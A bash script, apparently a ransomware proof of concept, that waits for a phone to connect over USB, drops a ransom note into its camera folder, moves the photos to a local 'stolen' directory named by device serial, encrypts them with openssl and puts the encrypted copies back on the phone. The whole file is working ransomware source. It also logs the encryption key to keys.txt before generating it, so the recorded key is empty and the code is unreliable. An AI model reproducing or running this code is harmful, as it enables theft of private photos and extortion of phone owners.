#!/bin/bash
#This script will wait for a phone to be plugged in and encrypt its camera photos. Also saves pictures locally in data/stolen
oldusblist=$(lsusb)
"./wait-for-phone.sh"
LOCALPATH=$(pwd)
PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/Camera)
echo $PHONEPATH

#drop ransom note
ransomid=$(openssl rand 16 -hex)
echo "Dropping note..."
gvfs-copy "media/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png"
echo "Note dropped as ransom_$ransomid.png"
echo ""

#store ransomid and encryption key pair
echo `date --rfc-3339=seconds` "|" $ransomid "|" $enc_key >> keys/keys.txt 

#make folder to store stolen files. named as device serial number and timestamp
cd data/stolen
deviceinfo=$(lsusb | grep -v "$oldusblist")
devicebus=$(echo $deviceinfo | awk -F' |: ' '/Device /{gsub(" "," ");print $2}')
devicenumber=$(echo $deviceinfo | awk -F' |: ' '/Device /{gsub(" "," ");print $4}')

DEVICEID=$(udevadm info --name=/dev/bus/usb/$devicebus/$devicenumber | awk -F'=' '/ID_SERIAL=/{gsub("_"," ");print $2}')

timestamp=$(date)
TRANSDIR="$DEVICEID $timestamp"
mkdir "$TRANSDIR"

#transfer and encrypt each file
enc_key=$(openssl rand 16 -hex)

cd "$PHONEPATH"

currentfile=1
filecount=$(ls -1 | grep -v "ransom" | grep -v ".enc.jpg" | wc -l)

for f in *
do 
	
	if [[ $f != "ransom"* ]] && [[ $f != *".enc.jpg" ]]; then #encrypt all files that are not already encrypted nor the ransom note file
		echo "transferring and encrypting $f ($currentfile/$filecount)..."
		gvfs-move "$f" "$LOCALPATH/data/stolen/$TRANSDIR"
		openssl aes-256-cbc -a -salt -in "$LOCALPATH/data/stolen/$TRANSDIR/$f" -out "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" -k $enc_key
		touch -r "$LOCALPATH/data/stolen/$TRANSDIR/$f" "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" #give same timestamps to new encrypted file as old file
		gvfs-move "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" .	
		
		currentfile=$((currentfile+1))
	fi

done

#re-copy note so it shows up first in gallery
cd "$LOCALPATH"
sleep 1
gvfs-copy "media/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png" 



#Finish up
echo ""
echo Encryption complete. check keys/keys.txt for ransom id and key
echo Transferred photos stored in "data/stolen/$TRANSDIR"
echo ""
